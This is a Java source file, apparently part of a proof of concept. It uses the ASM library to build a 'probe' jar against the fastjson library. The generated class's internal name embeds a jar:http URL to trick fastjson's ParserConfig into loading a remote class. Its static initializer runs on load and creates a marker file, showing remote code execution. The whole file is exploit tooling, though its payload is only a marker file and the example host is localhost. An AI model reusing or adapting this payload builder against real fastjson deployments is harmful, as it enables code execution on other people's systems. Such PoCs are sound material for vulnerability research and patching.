import org.objectweb.asm.AnnotationVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.file.Files;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;

/**
 * Generate a probe jar whose bytecode internal name embeds the jar:http URL used by the PoC.
 */
public final class CraftProbe {
    private CraftProbe() {
    }

    public static String internalName(String hostToken, int port, String entry) {
        // hostToken is typically the integer form of 127.0.0.1: 2130706433
        return "jar:http://" + hostToken + ":" + port + "/probe!/" + entry;
    }

    public static String typeName(String hostToken, int port, String entry) {
        // reverse of typeName.replace('.', '/') used by ParserConfig
        return "jar:http:.." + hostToken + ":" + port + ".probe!." + entry;
    }

    public static byte[] craftClass(String internalName, String pwnedFile) {
        ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        writer.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, internalName, null, "java/lang/Object", null);

        AnnotationVisitor annotation = writer.visitAnnotation("Lcom/alibaba/fastjson/annotation/JSONType;", true);
        annotation.visitEnd();

        MethodVisitor method = writer.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        method.visitCode();
        method.visitVarInsn(Opcodes.ALOAD, 0);
        method.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        method.visitInsn(Opcodes.RETURN);
        method.visitMaxs(1, 1);
        method.visitEnd();

        method = writer.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
        method.visitCode();
        method.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;");
        method.visitLdcInsn("REMOTE POC <clinit> EXECUTED (class defined from jar:http URL)");
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
        method.visitTypeInsn(Opcodes.NEW, "java/io/File");
        method.visitInsn(Opcodes.DUP);
        method.visitLdcInsn(pwnedFile);
        method.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/io/File", "<init>", "(Ljava/lang/String;)V", false);
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/File", "createNewFile", "()Z", false);
        method.visitInsn(Opcodes.POP);
        method.visitInsn(Opcodes.RETURN);
        method.visitMaxs(3, 0);
        method.visitEnd();

        writer.visitEnd();
        return writer.toByteArray();
    }

    public static byte[] writeProbeJar(File jarFile, String hostToken, int port, String entry, String pwnedFile) throws Exception {
        String internal = internalName(hostToken, port, entry);
        byte[] classBytes = craftClass(internal, pwnedFile);
        File parent = jarFile.getAbsoluteFile().getParentFile();
        if (parent != null) {
            parent.mkdirs();
        }
        JarOutputStream jos = new JarOutputStream(new FileOutputStream(jarFile));
        try {
            jos.putNextEntry(new JarEntry("POC.class"));
            jos.write(classBytes);
            jos.closeEntry();
        } finally {
            jos.close();
        }
        return Files.readAllBytes(jarFile.toPath());
    }
}
